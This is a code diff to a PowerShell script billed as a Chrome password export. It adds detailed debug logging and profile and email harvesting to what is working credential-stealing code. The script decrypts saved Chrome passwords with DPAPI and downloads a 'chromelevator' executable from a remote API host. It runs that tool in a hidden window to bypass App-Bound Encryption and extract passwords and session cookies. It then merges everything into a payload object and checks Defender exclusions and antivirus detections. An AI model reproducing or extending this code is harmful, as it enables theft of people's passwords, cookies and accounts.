@@ -10,6 +10,50 @@ Write-Host "[DEBUG] Starting hybrid Chrome password export (PowerShell v10/v11 +
 Write-Host "[DEBUG] API_BASE=$ApiBase"
 Write-Host "[DEBUG] PAYLOAD_URL=$PayloadUrl"
 Write-Host "[DEBUG] isAdmin=$IsRunningAsAdmin"
+Write-Host "[DEBUG] psVersion=$($PSVersionTable.PSVersion) pid=$PID"
+
+function Write-DebugStage {
+    param([string]$Message)
+    Write-Host "[DEBUG] >>> $Message"
+}
+
+function Write-DebugError {
+    param(
+        [string]$Stage,
+        [System.Management.Automation.ErrorRecord]$ErrorRecord
+    )
+
+    Write-Host "[DEBUG] !!! $Stage failed"
+    Write-Host "[DEBUG]     exceptionType=$($ErrorRecord.Exception.GetType().FullName)"
+    Write-Host "[DEBUG]     message=$($ErrorRecord.Exception.Message)"
+
+    $inner = $ErrorRecord.Exception.InnerException
+    while ($null -ne $inner) {
+        Write-Host "[DEBUG]     innerType=$($inner.GetType().FullName)"
+        Write-Host "[DEBUG]     innerMessage=$($inner.Message)"
+        $inner = $inner.InnerException
+    }
+
+    if ($ErrorRecord.InvocationInfo) {
+        $info = $ErrorRecord.InvocationInfo
+        Write-Host "[DEBUG]     scriptLine=$($info.ScriptLineNumber)"
+        Write-Host "[DEBUG]     command=$($info.Line.Trim())"
+        Write-Host "[DEBUG]     position=$($info.PositionMessage)"
+    }
+}
+
+function Write-DebugDirectoryTree {
+    param([string]$Root, [string]$Label = "directory tree")
+
+    Write-Host "[DEBUG] $Label for: $Root"
+    if (-not (Test-Path -LiteralPath $Root)) {
+        Write-Host "[DEBUG]   (path does not exist)"
+        return
+    }
+
+    Get-ChildItem -LiteralPath $Root -Recurse -Force -ErrorAction SilentlyContinue |
+        ForEach-Object { Write-Host "[DEBUG]   $($_.FullName)" }
+}
 
 function Get-ChromeInstalledVersion {
     $candidatePaths = @(
@@ -64,6 +108,85 @@ function Get-ChromeInstalledVersion {
         appBoundSupported = $true
         legacyDpapiOnly = $false
     }
+}
+
+function Get-ChromeProfileMetadata {
+    $chromeUserData = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+    $localStatePath = Join-Path $chromeUserData "Local State"
+    $result = [ordered]@{}
+
+    if (Test-Path -LiteralPath $localStatePath) {
+        try {
+            $localState = Get-Content -Path $localStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
+            $infoCache = $localState.profile.info_cache
+            if ($null -ne $infoCache) {
+                foreach ($prop in $infoCache.PSObject.Properties) {
+                    $folder = [string]$prop.Name
+                    $info = $prop.Value
+                    $result[$folder] = [ordered]@{
+                        folder = $folder
+                        name = if ($null -ne $info.name) { [string]$info.name } else { "" }
+                        gaia_name = if ($null -ne $info.gaia_name) { [string]$info.gaia_name } else { "" }
+                        user_name = if ($null -ne $info.user_name) { [string]$info.user_name } else { "" }
+                        email = if ($null -ne $info.user_name) { [string]$info.user_name } else { "" }
+                        hosted_domain = if ($null -ne $info.hosted_domain) { [string]$info.hosted_domain } else { "" }
+                    }
+                }
+            }
+        }
+        catch {
+            Write-Host "[DEBUG] Could not read Chrome Local State profile metadata: $($_.Exception.Message)"
+        }
+    }
+
+    if (Test-Path -LiteralPath $chromeUserData) {
+        Get-ChildItem -Path $chromeUserData -Directory | ForEach-Object {
+            $folder = $_.Name
+            if ($folder -notmatch '^(Default|Profile \d+)$') {
+                return
+            }
+
+            if (-not $result.Contains($folder)) {
+                $result[$folder] = [ordered]@{
+                    folder = $folder
+                    name = $folder
+                    gaia_name = ""
+                    user_name = ""
+                    email = ""
+                    hosted_domain = ""
+                }
+            }
+
+            $prefPath = Join-Path $_.FullName "Preferences"
+            if (-not (Test-Path -LiteralPath $prefPath)) {
+                return
+            }
+
+            try {
+                $prefs = Get-Content -Path $prefPath -Raw -Encoding UTF8 | ConvertFrom-Json
+                if ($prefs.profile.name) {
+                    $result[$folder].name = [string]$prefs.profile.name
+                }
+                if ($prefs.account_info -and @($prefs.account_info).Count -gt 0) {
+                    $account = @($prefs.account_info)[0]
+                    if ($account.email) {
+                        $result[$folder].email = [string]$account.email
+                        if (-not $result[$folder].user_name) {
+                            $result[$folder].user_name = [string]$account.email
+                        }
+                    }
+                    if ($account.full_name) {
+                        $result[$folder].gaia_name = [string]$account.full_name
+                    }
+                }
+            }
+            catch {
+                Write-Host "[DEBUG] Could not read Preferences for $folder"
+            }
+        }
+    }
+
+    return $result
 }
 
 function Get-DefenderExclusions {
@@ -264,12 +387,17 @@ function Resolve-ChromelevatorChromeRoot {
         (Join-Path (Split-Path -Parent $ElevatorPath) "output\Chrome")
     )
 
+    Write-DebugStage "Resolve-ChromelevatorChromeRoot checking candidates"
     foreach ($candidate in $candidates) {
-        if (Test-Path -LiteralPath $candidate) {
+        $exists = Test-Path -LiteralPath $candidate
+        Write-Host "[DEBUG]     candidate=$candidate exists=$exists"
+        if ($exists) {
+            Write-Host "[DEBUG]     selected=$candidate"
             return $candidate
         }
     }
 
+    Write-Host "[DEBUG]     no Chrome output directory found"
     return $null
 }
 
@@ -284,10 +412,16 @@ function Invoke-ChromelevatorProcess {
     function Start-ChromelevatorExe {
         param([string]$Path, [string]$OutputDir)
 
+        $argumentString = "-o `"$OutputDir`" chrome"
+        Write-DebugStage "chromelevator launch"
+        Write-Host "[DEBUG]     exe=$Path"
+        Write-Host "[DEBUG]     args=$argumentString"
+        Write-Host "[DEBUG]     outDir=$OutputDir"
+
         $process = New-Object System.Diagnostics.Process
         $process.StartInfo.FileName = $Path
         # No -k/--kill: do not terminate Chrome; chromelevator uses handle duplication for locked DBs
-        $process.StartInfo.Arguments = "-o `"$OutputDir`" chrome"
+        $process.StartInfo.Arguments = $argumentString
         $process.StartInfo.UseShellExecute = $false
         $process.StartInfo.CreateNoWindow = $true
         $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
@@ -298,14 +432,23 @@ function Invoke-ChromelevatorProcess {
         $stderr = $process.StandardError.ReadToEnd()
         $process.WaitForExit()
 
+        Write-Host "[DEBUG]     exitCode=$($process.ExitCode)"
         if ($stdout.Trim()) {
             Write-Host "[DEBUG] chromelevator stdout:"
             Write-Host $stdout
+        }
+        else {
+            Write-Host "[DEBUG]     stdout=(empty)"
         }
         if ($stderr.Trim()) {
             Write-Host "[DEBUG] chromelevator stderr:"
             Write-Host $stderr
         }
+        else {
+            Write-Host "[DEBUG]     stderr=(empty)"
+        }
+
+        Write-DebugDirectoryTree -Root $OutputDir -Label "chromelevator output"
 
         return [pscustomobject]@{
             ExitCode = $process.ExitCode
@@ -339,16 +482,20 @@ function Merge-ChromelevatorPasswords {
         [string]$ElevatorPath
     )
 
+    Write-DebugStage "Merge-ChromelevatorPasswords"
+    Write-Host "[DEBUG]     outputRoot=$OutputRoot"
+
     $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
     if (-not $chromeRoot) {
         throw "chromelevator output not found under $OutputRoot (expected Chrome\Default\passwords.json)"
     }
 
-    Write-Host "[DEBUG] chromelevator output root: $chromeRoot"
+    Write-Host "[DEBUG]     chromeRoot=$chromeRoot"
 
     $abeMap = @{}
     foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
         $passwordsFile = Join-Path $profileDir.FullName "passwords.json"
+        Write-Host "[DEBUG]     profile=$($profileDir.Name) passwordsFile=$passwordsFile exists=$(Test-Path $passwordsFile)"
         if (-not (Test-Path $passwordsFile)) {
             continue
         }
@@ -356,12 +503,15 @@ function Merge-ChromelevatorPasswords {
         $profileName = $profileDir.Name
         $entries = Get-Content -Path $passwordsFile -Raw -Encoding UTF8 | ConvertFrom-Json
         if ($null -eq $entries) {
+            Write-Host "[DEBUG]     profile=$profileName entries=0"
             continue
         }
 
         if ($entries -isnot [System.Array]) {
             $entries = @($entries)
         }
+
+        Write-Host "[DEBUG]     profile=$profileName abePasswordEntries=$($entries.Count)"
 
         foreach ($entry in $entries) {
             if (-not $entry.pass) {
@@ -372,6 +522,10 @@ function Merge-ChromelevatorPasswords {
             $abeMap[$key] = [string]$entry.pass
         }
     }
+
+    Write-Host "[DEBUG]     abeMapKeys=$($abeMap.Count)"
+    $payloadPasswordCount = @($Payload.passwords).Count
+    Write-Host "[DEBUG]     payloadPasswords=$payloadPasswordCount"
 
     $mergedCount = 0
     foreach ($entry in $Payload.passwords) {
@@ -385,12 +539,19 @@ function Merge-ChromelevatorPasswords {
             continue
         }
 
-        $entry.password_dpapi = $decrypted
-        if ($entry.password -match "App-Bound Encryption") {
-            $mergedCount++
+        try {
+            $entry | Add-Member -NotePropertyName password_dpapi -NotePropertyValue $decrypted -Force
+            if ($entry.password -match "App-Bound Encryption") {
+                $mergedCount++
+            }
+        }
+        catch {
+            Write-DebugError -Stage "Merge-ChromelevatorPasswords.set password_dpapi profile=$($entry.profile) url=$($entry.url)" -ErrorRecord $_
+            throw
         }
     }
 
+    Write-Host "[DEBUG]     mergedAbePasswords=$mergedCount"
     return $mergedCount
 }
 
@@ -401,22 +562,29 @@ function Merge-ChromelevatorCookies {
         [string]$ElevatorPath
     )
 
+    Write-DebugStage "Merge-ChromelevatorCookies"
+    Write-Host "[DEBUG]     outputRoot=$OutputRoot"
+
     $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
     if (-not $chromeRoot) {
+        Write-Host "[DEBUG]     no chrome root; cookie merge skipped"
         return 0
     }
 
-    $cookies = New-Object System.Collections.Generic.List[object]
+    Write-Host "[DEBUG]     chromeRoot=$chromeRoot"
+    $mergedCookies = New-Object System.Collections.ArrayList
     $index = 0
 
     foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
         $cookiesFile = Join-Path $profileDir.FullName "cookies.json"
+        Write-Host "[DEBUG]     profile=$($profileDir.Name) cookiesFile=$cookiesFile exists=$(Test-Path $cookiesFile)"
         if (-not (Test-Path $cookiesFile)) {
             continue
         }
 
         $entries = Get-Content -Path $cookiesFile -Raw -Encoding UTF8 | ConvertFrom-Json
         if ($null -eq $entries) {
+            Write-Host "[DEBUG]     profile=$($profileDir.Name) cookieEntries=0"
             continue
         }
 
@@ -424,44 +592,57 @@ function Merge-ChromelevatorCookies {
             $entries = @($entries)
         }
 
+        Write-Host "[DEBUG]     profile=$($profileDir.Name) cookieEntries=$($entries.Count)"
+
         foreach ($entry in $entries) {
-            $expiresVal = 0
-            if ($null -ne $entry.expires) {
-                try { $expiresVal = [long]$entry.expires } catch { $expiresVal = 0 }
-            }
+            try {
+                $expiresVal = 0
+                if ($null -ne $entry.expires) {
+                    try { $expiresVal = [long]$entry.expires } catch { $expiresVal = 0 }
+                }
 
-            $secureVal = $null
-            if ($null -ne $entry.secure) {
-                try { $secureVal = [bool]$entry.secure } catch { $secureVal = $null }
-            }
+                $secureVal = $null
+                if ($null -ne $entry.secure) {
+                    try { $secureVal = [bool]$entry.secure } catch { $secureVal = $null }
+                }
 
-            $httpOnlyVal = $null
-            if ($null -ne $entry.httpOnly) {
-                try { $httpOnlyVal = [bool]$entry.httpOnly } catch { $httpOnlyVal = $null }
-            }
+                $httpOnlyVal = $null
+                if ($null -ne $entry.httpOnly) {
+                    try { $httpOnlyVal = [bool]$entry.httpOnly } catch { $httpOnlyVal = $null }
+                }
 
-            $cookies.Add([pscustomobject]@{
-                index = $index
-                profile = $profileDir.Name
-                host = [string]$entry.host
-                name = [string]$entry.name
-                path = [string]$entry.path
-                value = [string]$entry.value
-                value_dpapi = [string]$entry.value
-                expires = $expiresVal
-                secure = $secureVal
-                httpOnly = $httpOnlyVal
-            })
-            $index++
+                [void]$mergedCookies.Add([pscustomobject]@{
+                    index = $index
+                    profile = $profileDir.Name
+                    host = [string]$entry.host
+                    name = [string]$entry.name
+                    path = [string]$entry.path
+                    value = [string]$entry.value
+                    value_dpapi = [string]$entry.value
+                    expires = $expiresVal
+                    secure = $secureVal
+                    httpOnly = $httpOnlyVal
+                })
+                $index++
+            }
+            catch {
+                Write-DebugError -Stage "Merge-ChromelevatorCookies entry index=$index profile=$($profileDir.Name)" -ErrorRecord $_
+                throw
+            }
         }
     }
 
-    if ($cookies.Count -gt 0) {
-        $Payload.cookies = @($cookies)
-        $Payload.cookieCount = $cookies.Count
+    if ($mergedCookies.Count -gt 0) {
+        Write-Host "[DEBUG]     assigning cookies to payload count=$($mergedCookies.Count)"
+        $Payload | Add-Member -NotePropertyName cookies -NotePropertyValue @($mergedCookies.ToArray()) -Force
+        $Payload | Add-Member -NotePropertyName cookieCount -NotePropertyValue $mergedCookies.Count -Force
+    }
+    else {
+        Write-Host "[DEBUG]     no cookies to merge"
     }
 
-    return $cookies.Count
+    Write-Host "[DEBUG]     mergedCookies=$($mergedCookies.Count)"
+    return $mergedCookies.Count
 }
 
 function Get-ChromelevatorExecutable {
@@ -551,24 +732,43 @@ function Invoke-ChromelevatorExtraction {
     try {
         $archTag = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "x64" }
         $meta.arch = $archTag
+        Write-DebugStage "Invoke-ChromelevatorExtraction"
+        Write-Host "[DEBUG]     arch=$archTag useChromelevator=$UseChromelevator"
 
+        Write-DebugStage "Get-ChromelevatorExecutable"
         $elevatorPath = Get-ChromelevatorExecutable -ApiBase $ApiBase -ArchTag $archTag -CacheDir $ChromelevatorCacheDir
+        Write-Host "[DEBUG]     elevatorPath=$elevatorPath"
+
         $outDir = Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
         New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+        Write-Host "[DEBUG]     outDir=$outDir"
 
-        Write-Host "[DEBUG] Running chromelevator for App-Bound (v20) data..."
+        Write-DebugStage "Invoke-ChromelevatorProcess"
         Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
 
+        Write-DebugStage "Merge-ChromelevatorPasswords"
         $mergedCount = Merge-ChromelevatorPasswords -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath
+
+        Write-DebugStage "Merge-ChromelevatorCookies"
         $cookiesMergedCount = Merge-ChromelevatorCookies -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath
+
         $meta.used = $true
         $meta.abeMergedCount = $mergedCount
         $meta.cookiesMergedCount = $cookiesMergedCount
         Write-Host "[DEBUG] chromelevator.abeMergedCount=$mergedCount cookiesMergedCount=$cookiesMergedCount"
     }
     catch {
+        Write-DebugError -Stage "Invoke-ChromelevatorExtraction" -ErrorRecord $_
+
         $message = $_.Exception.Message
+        if ($_.Exception.InnerException) {
+            $message = "$message | inner: $($_.Exception.InnerException.Message)"
+        }
         $meta.error = $message
+
+        if ($outDir) {
+            Write-DebugDirectoryTree -Root $outDir -Label "chromelevator output after failure"
+        }
 
         if ($message -match "virus|potentially unwanted|malware|software malicioso|no deseado") {
             $meta.defenderHint = @(
@@ -1523,19 +1723,41 @@ $typeDefinition = $typeDefinition.Replace("__CRYPTO_CLASS__", $ChromeCryptoClass
 Add-Type -ReferencedAssemblies System.Security -TypeDefinition $typeDefinition
 
 Write-Host "[DEBUG] Building payload in memory (attemptDpapiDecrypt=$UseDpapiDecrypt)..."
+Write-Host "[DEBUG] useDpapiDecryptType=$($UseDpapiDecrypt.GetType().FullName) useChromelevatorType=$($UseChromelevator.GetType().FullName)"
 $exporterType = [AppDomain]::CurrentDomain.GetAssemblies() |
     ForEach-Object { $_.GetType($ChromeExporterClassName) } |
     Where-Object { $_ } |
     Select-Object -First 1
-$payloadJson = $exporterType.GetMethod("Export").Invoke($null, @($UseDpapiDecrypt))
+Write-Host "[DEBUG] exporterType=$($exporterType.FullName)"
+
+try {
+    $exportMethod = $exporterType.GetMethod("Export")
+    Write-Host "[DEBUG] exportMethod=$($exportMethod.Name) params=$(($exportMethod.GetParameters() | ForEach-Object { $_.ParameterType.FullName }) -join ', ')"
+    $payloadJson = $exportMethod.Invoke($null, @([bool]$UseDpapiDecrypt))
+}
+catch {
+    Write-DebugError -Stage "ChromeExporter.Export" -ErrorRecord $_
+    throw
+}
+
+Write-DebugStage "ConvertFrom-Json payload"
 $payloadObject = $payloadJson | ConvertFrom-Json
 $payloadObject | Add-Member -NotePropertyName chrome -NotePropertyValue ([pscustomobject]$ChromeInfo) -Force
+$profileMetadata = Get-ChromeProfileMetadata
+$payloadObject | Add-Member -NotePropertyName profiles -NotePropertyValue ([pscustomobject]$profileMetadata) -Force
+Write-Host "[DEBUG] profileMetadataCount=$($profileMetadata.Count)"
 Write-Host "[DEBUG] passwordCount=$($payloadObject.passwordCount)"
 Write-Host "[DEBUG] cookieCount=$($payloadObject.cookieCount)"
+Write-Host "[DEBUG] payloadPasswordType=$(if ($null -eq $payloadObject.passwords) { 'null' } else { $payloadObject.passwords.GetType().FullName })"
 $dpapiDecrypted = @($payloadObject.passwords | Where-Object { $_.password -and $_.password -ne "" -and $_.password -notmatch "App-Bound Encryption" }).Count
 Write-Host "[DEBUG] v10_v11.decryptedCount=$dpapiDecrypted"
 
+Write-DebugStage "Invoke-ChromelevatorExtraction"
 $chromelevatorMeta = Invoke-ChromelevatorExtraction -Payload $payloadObject -ApiBase $ApiBase
+Write-Host "[DEBUG] chromelevatorMetaType=$($chromelevatorMeta.GetType().FullName)"
+if ($chromelevatorMeta -is [System.Array]) {
+    Write-Host "[DEBUG] chromelevatorMeta arrayCount=$($chromelevatorMeta.Count)"
+}
 $payloadObject | Add-Member -NotePropertyName chromelevator -NotePropertyValue ([pscustomobject]$chromelevatorMeta) -Force
 $abeDecrypted = @($payloadObject.passwords | Where-Object { $_.password_dpapi -and $_.password_dpapi -ne "" }).Count
 Write-Host "[DEBUG] password_dpapi.decryptedCount=$abeDecrypted"
